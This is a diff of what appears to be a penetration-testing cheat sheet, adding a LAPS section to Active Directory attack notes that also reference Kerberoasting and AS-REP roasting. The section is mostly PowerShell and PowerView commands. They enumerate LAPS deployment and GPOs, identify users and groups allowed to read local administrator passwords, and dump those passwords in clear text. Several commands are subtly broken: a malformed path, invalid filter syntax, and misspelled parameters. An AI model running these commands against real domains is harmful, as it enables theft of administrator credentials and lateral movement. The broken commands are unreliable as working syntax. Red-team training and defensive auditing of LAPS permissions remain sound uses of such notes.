@@ -108,27 +108,63 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatev
 #### Then Kerberoast user
 
 ## LAPS
-- Local Administrator Password Solution (LAPS)
 - On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
+- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
+
+#### Check if LAPS is installed on local computer
+```
+Get-Childitem 'C:\Program Files\LAPS\CSE directory\library AdmPwd.dll'
+Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
+```
+
+#### Check existence of LAPS
+```
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+Get-DomainGPO -Identity *LAPS*
+Get-DomainComputer -filter {ms-Mcs-AdmPwdExpirationTime- like *} -Propterties ms-Mcs-AdmPwdExpirationTime like
+```
+
+#### Check the LAPS configuration
+- https://github.com/PowerShell/GPRegistryPolicy
+- Password complexity, password length, password expiration, Acccount managing LAPS
+```
+Parse-PolFile \\<DC\SYSVOL\<DOMAIN>\Policies\<GUID>\Machine\Registry.pol
+```
+
+#### Check to which computers the LAPS GPO is applied to
+```
+Get-DomainOU -GPLink "<GUID NAME>" -Properties distinguishedname
+Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
+```
 
 #### Find all users who can read passwords in clear text machines in OU's
 ```
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+Get-DomainOU -Fulldata | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+
+Get-DomainOU -Fulldata | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;$_}
 ```
 
 ```
-Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
+Import-Module AdmPwd.PS.psd1
 Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+```
+
+#### If retured groups, get the users:
+```
+$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
 ```
 
 #### Read clear-text passwords:
 ```
 Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
-```
+Get-DomainComputer -filter {ms-Mcs-AdmPwdExpirationTime -like '*'}
 
-```
+#LAPS Powershell cmdlet
 Get-AdmPwdPassword -ComputerName <MACHINE NAME>
 ```
+
 
 ## AS-REP Roasting
 #### Enumerating accounts with kerberos preauth disabled
